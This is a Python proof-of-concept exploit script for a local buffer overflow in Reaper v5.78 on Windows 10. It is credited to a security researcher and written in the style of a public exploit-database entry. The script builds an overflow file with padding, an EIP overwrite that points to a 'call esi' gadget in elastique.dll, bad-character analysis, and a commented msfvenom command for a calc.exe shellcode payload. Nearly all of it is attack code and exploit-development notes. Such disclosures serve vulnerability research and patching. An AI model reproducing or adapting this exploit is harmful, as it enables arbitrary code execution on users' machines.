"""
Full title:         Reaper v.5.78 Local Buffer Overflow
Exploit Author:     Paolo Stagno - voidsec@voidsec.com - https://voidsec.com
Vendor Homepage:    https://www.reaper.fm/
Version:            Reaper v.5.78
Tested on:          Windows 10 x64 Pro v.10.0.18363 Build 18363
Category:           local exploits
Platform:           windows
Usage:              Reaper > Options > Preferences > ReaScript > in the "Force ReaScript to use specific python dll" textarea paste the content of "reaper_5.78_exploit.txt"
"""
#!/usr/bin/python
import struct

poc=open("reaper_5.78_exploit.txt", "w")

total_size=2000
# |                   (465)                   |
# | garbage (37) | shellcode (max 465-37=428) | EIP (4) | filler (2000-469=1531) |
offset=465
buff = ""
buff += "A"*37                          # garbage
buff += "BBBB"                          # alignment
# shellcode
# msfvenom -a x86 --platform windows -p windows/exec CMD=calc.exe exitfunc=thread -b '\x00\x0a\x0d\x7f' -e x86/alpha_mixed BufferRegister=ESI -f python --smallest 
# unfortuntely is between 448-440 bytes long
# alternatively we can create our buffer with the following structure: 0x0019741c : Pointer into normal cyclic pattern at ESP-0x4264 (-16996) : 0x00197530 : offset 1036, length 760 

# | garbage (37) | ESP-0x4264; JMP ESP () | filler () | EIP (4) | filler () | shellcode () | filler () |
buff += ""                              
# ------ shellcode ------
buff += "B"*(offset-len(buff))          # filler
# must chose a pointer withouth bad chars and  in the good-chars range
# 0x1003111b : call esi | ascii {PAGE_EXECUTE_READ} [elastique.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files (x86)\REAPER\Plugins\elastique.dll)
buff += struct.pack("<I",0x1003111b)    # EIP
buff += "C"*(total_size-len(buff))      # filler
# good chars
""" 
    \x01\x02\x03\x04\x05\x06\x07\x08\x09    \x0b\x0c    \x0e\x0f
\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f
\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f
\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f
\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f
\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f
\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f
\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e
"""
# known badchars: \x00\x0a\x0d\x7f 
# everything above 0x80 got translated as follows
"""
,-----------------------------------------------.
| Comparison results:                           |
|-----------------------------------------------|
|80 81 82 83 84 85 86 87 88 89 8a 8b 8c 8d 8e 8f| File
|e2 82 ac c2 81 e2 80 9a c6 92 e2 80 9e e2 80 a6| Memory
|90 91 92 93 94 95 96 97 98 99 9a 9b 9c 9d 9e 9f| File
|e2 80 a0 e2 80 a1 cb 86 e2 80 b0 c5 a0 e2 80 b9| Memory
|a0 a1 a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad ae af| File
|c2 a0 c2 a1 c2 a2 c2 a3 c2 a4 c2 a5 c2 a6 c2 a7| Memory
|b0 b1 b2 b3 b4 b5 b6 b7 b8 b9 ba bb bc bd be bf| File
|c2 a8 c2 a9 c2 aa c2 ab c2 ac c2 ad c2 ae c2 af| Memory
|c0 c1 c2 c3 c4 c5 c6 c7 c8 c9 ca cb cc cd ce cf| File
|c3 80 c3 81 c3 82 c3 83 c3 84 c3 85 c3 86 c3 87| Memory
|d0 d1 d2 d3 d4 d5 d6 d7 d8 d9 da db dc dd de df| File
|c3 88 c3 89 c3 8a c3 8b c3 8c c3 8d c3 8e c3 8f| Memory
|e0 e1 e2 e3 e4 e5 e6 e7 e8 e9 ea eb ec ed ee ef| File
|c3 a0 c3 a1 c3 a2 c3 a3 c3 a4 c3 a5 c3 a6 c3 a7| Memory
|f0 f1 f2 f3 f4 f5 f6 f7 f8 f9 fa fb fc fd fe ff| File
|c3 a8 c3 a9 c3 aa c3 ab c3 ac c3 ad c3 ae c3 af| Memory
`-----------------------------------------------'
"""
poc.write(buff)
poc.close()